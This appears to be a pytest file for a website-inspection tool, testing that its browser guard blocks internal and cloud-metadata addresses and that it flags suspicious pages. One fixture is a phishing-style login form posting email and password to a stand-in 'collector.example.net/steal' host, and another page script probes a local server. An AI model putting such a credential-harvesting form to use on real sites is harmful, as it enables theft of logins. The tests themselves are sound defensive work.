import asyncio
import functools
import http.server
import pathlib
import threading

from app.analysis import website
from app.analysis.website import _guard, inspect_site
from app.config import settings


class FakeRoute:
    def __init__(self):
        self.action = None

    async def continue_(self):
        self.action = "continue"

    async def abort(self):
        self.action = "abort"


class FakeRequest:
    def __init__(self, url):
        self.url = url


def run_guard(url, cache=None):
    route = FakeRoute()
    asyncio.run(_guard(route, FakeRequest(url), {} if cache is None else cache))
    return route.action


def test_guard_allows_data_urls():
    assert run_guard("data:text/plain;base64,aGk=") == "continue"


def test_guard_blocks_internal_addresses(monkeypatch):
    monkeypatch.setattr(settings, "allow_local_demo_hosts", "")
    assert run_guard("http://169.254.169.254/latest/") == "abort"
    assert run_guard("http://127.0.0.1:8000/") == "abort"
    assert run_guard("http://192.168.0.1/") == "abort"


def test_guard_remembers_its_decision_per_host(monkeypatch):
    calls = []

    def fake(url):
        calls.append(url)
        return True, "ok"

    monkeypatch.setattr(website, "is_safe_public_url", fake)
    cache = {}
    assert run_guard("https://a.example/one", cache) == "continue"
    assert run_guard("https://a.example/two", cache) == "continue"
    assert len(calls) == 1


def test_inspect_site_refuses_unsafe_url(monkeypatch):
    monkeypatch.setattr(settings, "allow_local_demo_hosts", "")
    r = asyncio.run(inspect_site("http://192.168.1.1/", "t0"))
    assert r["skipped"] is True


# ---------- real browser tests against tiny local servers ----------

class Quiet(http.server.SimpleHTTPRequestHandler):
    def log_message(self, *args):
        pass


def serve_folder(folder):
    handler = functools.partial(Quiet, directory=str(folder))
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv


def make_counter():
    class Hits(http.server.BaseHTTPRequestHandler):
        hits: list = []

        def do_GET(self):
            type(self).hits.append(self.path)
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *args):
            pass

    Hits.hits = []
    srv = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Hits)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    return srv, Hits


def test_inspect_site_reads_a_phishing_style_login_form(monkeypatch, tmp_path):
    (tmp_path / "index.html").write_text(
        "<html><head><title>Login</title></head><body>"
        '<form action="http://collector.example.net/steal" method="post">'
        '<input type="email" name="email"><input type="password" name="pw">'
        "</form></body></html>", encoding="utf-8")
    srv = serve_folder(tmp_path)
    port = srv.server_address[1]
    try:
        monkeypatch.setattr(settings, "allow_local_demo_hosts", "127.0.0.1:%d" % port)
        monkeypatch.setattr(settings, "artifacts_dir", str(tmp_path / "art"))
        r = asyncio.run(inspect_site("http://127.0.0.1:%d/" % port, "t1"))
    finally:
        srv.shutdown()
    assert r["title"] == "Login"
    assert r["password_form"] is True
    assert r["posts_to_other_host"] is True
    shot = pathlib.Path(r["screenshot"])
    assert shot.exists() and shot.stat().st_size > 1000


def test_inspect_site_does_not_flag_a_normal_search_form(monkeypatch, tmp_path):
    (tmp_path / "index.html").write_text(
        "<html><head><title>Shop</title></head><body>"
        '<form action="/search"><input type="text" name="q"></form></body></html>',
        encoding="utf-8")
    srv = serve_folder(tmp_path)
    port = srv.server_address[1]
    try:
        monkeypatch.setattr(settings, "allow_local_demo_hosts", "127.0.0.1:%d" % port)
        monkeypatch.setattr(settings, "artifacts_dir", str(tmp_path / "art"))
        r = asyncio.run(inspect_site("http://127.0.0.1:%d/" % port, "t2"))
    finally:
        srv.shutdown()
    assert r["password_form"] is False
    assert r["posts_to_other_host"] is False


def _page_that_calls(port_b):
    return ("<html><head><title>Probe</title></head><body><script>"
            'fetch("http://127.0.0.1:%d/ping", {mode: "no-cors"}).catch(function () {});'
            "</script></body></html>" % port_b)


def test_browser_cannot_reach_internal_addresses_the_page_asks_for(monkeypatch, tmp_path):
    srv_b, hits_cls = make_counter()
    port_b = srv_b.server_address[1]
    (tmp_path / "index.html").write_text(_page_that_calls(port_b), encoding="utf-8")
    srv_a = serve_folder(tmp_path)
    port_a = srv_a.server_address[1]
    try:
        # only server A is allowed; server B (also local) must stay unreachable
        monkeypatch.setattr(settings, "allow_local_demo_hosts", "127.0.0.1:%d" % port_a)
        monkeypatch.setattr(settings, "artifacts_dir", str(tmp_path / "art"))
        r = asyncio.run(inspect_site("http://127.0.0.1:%d/" % port_a, "t3"))
    finally:
        srv_a.shutdown()
        srv_b.shutdown()
    assert r["title"] == "Probe"
    assert hits_cls.hits == []


def test_control_the_same_request_succeeds_when_the_host_is_allowed(monkeypatch, tmp_path):
    srv_b, hits_cls = make_counter()
    port_b = srv_b.server_address[1]
    (tmp_path / "index.html").write_text(_page_that_calls(port_b), encoding="utf-8")
    srv_a = serve_folder(tmp_path)
    port_a = srv_a.server_address[1]
    try:
        monkeypatch.setattr(settings, "allow_local_demo_hosts",
                            "127.0.0.1:%d,127.0.0.1:%d" % (port_a, port_b))
        monkeypatch.setattr(settings, "artifacts_dir", str(tmp_path / "art"))
        asyncio.run(inspect_site("http://127.0.0.1:%d/" % port_a, "t4"))
    finally:
        srv_a.shutdown()
        srv_b.shutdown()
    assert hits_cls.hits == ["/ping"]